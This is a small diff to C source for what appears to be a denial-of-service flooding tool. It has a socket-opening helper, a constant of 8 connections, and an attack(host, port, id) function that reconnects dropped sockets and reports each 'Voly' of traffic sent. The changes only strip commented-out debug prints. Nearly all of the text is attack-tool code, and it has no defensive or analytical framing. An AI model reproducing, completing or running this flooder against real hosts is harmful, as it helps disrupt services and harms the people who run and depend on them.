@@ -15,7 +15,7 @@
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
@@ -46,7 +46,7 @@ int make_socket(char *host, char *port) {
 }
 
 void broke(int s) {
-	// do nothing
+
 }
 
 #define CONNECTIONS 8
@@ -67,7 +67,7 @@ void attack(char *host, char *port, int id) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
 			} else
-//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
